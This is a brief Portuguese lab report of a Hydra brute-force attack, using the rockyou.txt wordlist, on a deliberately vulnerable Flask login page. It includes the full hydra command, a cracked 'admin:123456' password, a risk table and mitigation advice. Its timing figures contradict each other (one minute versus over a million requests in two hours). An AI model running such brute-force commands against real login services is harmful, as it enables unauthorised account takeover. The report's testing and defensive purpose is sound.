# ?? Relatório de Ataque de Força Bruta com RockYou - Kali Linux

**Ferramenta utilizada:** Hydra  
**Alvo:** Servidor Flask vulnerável  
**IP do alvo:** `192.168.x.x` (substitua pelo IP real)  
**Porta:** `5000`  
**Wordlist:** `rockyou.txt`  

## ?? Passo a Passo Executado

### 1. Preparação do Ambiente
- **Sistema:** Kali Linux 2023.4  
- **Wordlist:**  
  ```bash
  # Descompactei o rockyou.txt (se necessário)
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz

Comando Hydra Executado
bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.x.x http-post-form "/:username=^USER^&password=^PASS^:Login falhou" -V -t 4
 
Resultados Obtidos
Senha quebrada: admin: 123456 

Tempo de ataque: 1 minuto

Fator,	Risco,	Explicação:

Senha comum,	Crítico,	Presente no top 0.1% do rockyou.txt
Sem rate limiting,	Alto,	Servidor permitiu >1M requisições em 2 horas
Protocolo HTTP,	Médio,	Credenciais trafegadas em texto claro

?? Recomendações de Mitigação
Bloqueio progressivo após 5 tentativas falhas

Trocar para HTTPS com certificado SSL

Monitorar logs para detectar padrões de ataque

Implementar 2FA para contas privilegiadas

?? O rockyou.txt contém 14 milhões de senhas reais vazadas. Senhas como "senha123" são encontradas rapidamente.